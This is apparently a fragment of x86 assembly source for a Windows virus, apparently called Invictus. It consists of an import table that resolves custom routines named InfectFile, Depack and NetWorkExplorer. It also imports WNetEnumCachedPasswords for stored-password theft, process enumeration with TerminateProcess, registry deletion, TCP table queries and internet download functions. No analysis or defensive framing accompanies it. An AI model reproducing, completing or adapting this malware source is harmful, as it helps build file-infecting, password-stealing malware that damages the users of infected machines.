function_list              dd offset invictus_dll_name
                           dd invictus_api_number
                           dd offset invictus_api_name
                           dd offset invictus_api

                           dd offset wininet_dll_name
                           dd wininet_api_number
                           dd offset wininet_api_name
                           dd offset wininet_api

                           dd offset mpr_dll_name
                           dd mpr_api_number
                           dd offset mpr_api_name
                           dd offset mpr_api

                           dd offset tmapi_dll_name
                           dd tmapi_api_number
                           dd offset tmapi_api_name
                           dd offset tmapi_api

                           dd offset kernel_dll_name
                           dd kernel_api_number
                           dd offset kernel_api_name
                           dd offset kernel_api

                           dd offset advapi_dll_name
                           dd advapi_api_number
                           dd offset advapi_api_name
                           dd offset advapi_api

                           dd offset iphlpapi_dll_name
                           dd iphlpapi_api_number
                           dd offset iphlpapi_api_name
                           dd offset iphlpapi_api

function_list_number       equ ($-function_list)/16

invictus_dll_name          db 'INVICTUS.DLL',0
wininet_dll_name           db 'WININET.DLL',0
mpr_dll_name               db 'MPR.DLL',0
tmapi_dll_name             db 'TMAPI.DLL',0
kernel_dll_name            db 'KERNEL32.DLL',0
advapi_dll_name            db 'ADVAPI32.DLL',0
iphlpapi_dll_name          db 'IPHLPAPI.DLL',0

invictus_api_name          db 'OpenCreate',0
                           db 'OpenRead',0
                           db 'OpenWrite',0
                           db 'InfectFile',0
                           db 'Depack',0
                           db 'CloseFile',0
                           db 'PlayFile',0
                           db 'NetWorkExplorer',0
                           db 'procB64encode',0
                           db 'procB64decode',0
wininet_api_name           db 'InternetOpenA',0
                           db 'InternetOpenUrlA',0
                           db 'InternetQueryDataAvailable',0
                           db 'InternetReadFile',0
                           db 'InternetCloseHandle',0
                           db 'InternetGetConnectedState',0
mpr_api_name               db 'WNetEnumCachedPasswords',0
tmapi_api_name             db 'InitTmTable',0
                           db 'GetTmElementByIndex',0
                           db 'CloseTmTable',0
kernel_api_name            db 'CreateToolhelp32Snapshot',0
                           db 'Process32First',0
                           db 'Process32Next',0
                           db 'TerminateProcess',0
                           db 'CreateMutexA',0
                           db 'OpenMutexA',0
advapi_api_name            db 'RegDeleteValueA',0
iphlpapi_api_name          db 'GetTcpTable',0

DATASEG

invictus_api               label
OpenCreate                 dd ?
OpenRead                   dd ?
OpenWrite                  dd ?
InfectFile                 dd ?
Depack                     dd ?
CloseFile                  dd ?
PlayFile                   dd ?
NetWorkExplorer            dd ?
procB64encode              dd ?
procB64decode              dd ?
invictus_api_number        equ ($-invictus_api)/4

wininet_api                label
InternetOpenA              dd ?
InternetOpenUrlA           dd ?
InternetQueryDataAvailable dd ?
InternetReadFile           dd ?
InternetCloseHandle        dd ?
InternetGetConnectedState  dd ?
wininet_api_number         equ ($-wininet_api)/4

mpr_api                    label
WNetEnumCachedPasswords    dd ?
mpr_api_number             equ ($-mpr_api)/4

tmapi_api                  label
InitTmTable                dd ?
GetTmElementByIndex        dd ?
CloseTmTable               dd ?
tmapi_api_number           equ ($-tmapi_api)/4

kernel_api                 label
CreateToolhelp32Snapshot   dd ?
Process32First             dd ?
Process32Next              dd ?
TerminateProcess           dd ?
CreateMutexA               dd ?
OpenMutexA                 dd ?
kernel_api_number          equ ($-kernel_api)/4

advapi_api                 label
RegDeleteValueA            dd ?
advapi_api_number          equ ($-advapi_api)/4

iphlpapi_api               label
GetTcpTable                dd ?
iphlpapi_api_number        equ ($-iphlpapi_api)/4

CODESEG
